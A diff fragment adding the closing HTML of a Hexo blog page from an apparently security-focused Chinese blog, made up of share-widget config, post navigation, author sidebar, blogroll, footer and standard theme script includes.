+        "bdSize": "16",
+        "bdStyle": "0"
+      },
+      "image": {
+        "viewList": ["tsina", "douban", "sqq", "qzone", "weixin", "twi", "fbook"],
+        "viewText": "分享到：",
+        "viewSize": "16"
+      }
+    }
+  </script>
+
+<script>
+  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='//bdimg.share.baidu.com/static/api/js/share.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+
+               </div>
+            
+            
+          </div>
+        
+        </div>
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/rt/" rel="next" title="RedTeam之使用msf+Donut交互式执行程序">
+                <i class="fa fa-chevron-left"></i> RedTeam之使用msf+Donut交互式执行程序
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/netuser/" rel="prev" title="红队技巧－－winAPI添加用户">
+                红队技巧－－winAPI添加用户 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="http://ww1.sinaimg.cn/large/007F8GgBly1g7vony4ltaj308w08wq30.jpg"
+                alt="冷逸" />
+            
+              <p class="site-author-name" itemprop="name">冷逸</p>
+              <p class="site-description motion-element" itemprop="description">做一个温柔的人...</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">71</span>
+                    <span class="site-state-item-name">Artikel</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">16</span>
+                    <span class="site-state-item-name">Kategorien</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">106</span>
+                    <span class="site-state-item-name">Tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+            <div class="feed-link motion-element">
+              <a href="/../../.deploy_git/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/lengjibo" target="_blank" title="GitHub"><i class="fa fa-fw fa-globe"></i>GitHub</a>
+                  
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="qqlengyi@163.com" target="_blank" title="E-Mail"><i class="fa fa-fw fa-globe"></i>E-Mail</a>
+                  
+                </span>
+              
+            </div>
+          
+        <div id="music163player">
+            <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=110 src="https://music.163.com/outchain/player?type=0&id=377079922&auto=1&height=90"></iframe>
+          </div>
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.zfsec.cn/" title="青春's blog" target="_blank">青春's blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.addon.pub/" title="Yokeen's blog" target="_blank">Yokeen's blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://freeerror.org/" title="之乎者也's blog" target="_blank">之乎者也's blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.bugbank.cn/team/FrigidSword" title="漏洞银行" target="_blank">漏洞银行</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.vulbox.com/team/Frigid%20Sword%E5%AE%89%E5%85%A8%E5%9B%A2%E9%98%9F" title="漏洞盒子" target="_blank">漏洞盒子</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://godpang.github.io/" title="Mr.赵" target="_blank">Mr.赵</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://amliaw4.github.io/" title="amliaW4'S Blog" target="_blank">amliaW4'S Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.se7ensec.cn/" title="se7en's Blog" target="_blank">se7en's Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://ninjia.gitbook.io/secskill/" title="secskill" target="_blank">secskill</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.bug1024.cn/" title="ibug" target="_blank">ibug</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://wwcx.org/" title="Strjziny's Blog" target="_blank">Strjziny's Blog</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2014 – <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">冷逸</span>
+
+  
+
+  
+</div>
+
+
+
+
+  <div class="powered-by">Erstellt mit  <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> v3.7.1</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme – <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Muse</a> v6.4.0</div>
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv" title="Total Visitors">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+
+  
+    <span class="site-pv" title="Total Views">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="//cdn.jsdelivr.net/jquery/2.1.3/jquery.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="//cdn.jsdelivr.net/velocity/1.2.3/velocity.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="//cdn.jsdelivr.net/velocity/1.2.3/velocity.ui.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.1/canvas-nest.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/three.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/canvas_sphere.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.4.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.4.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.4.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.4.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.4.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+<script type="text/javascript" src="/js/src/love.js"></script>
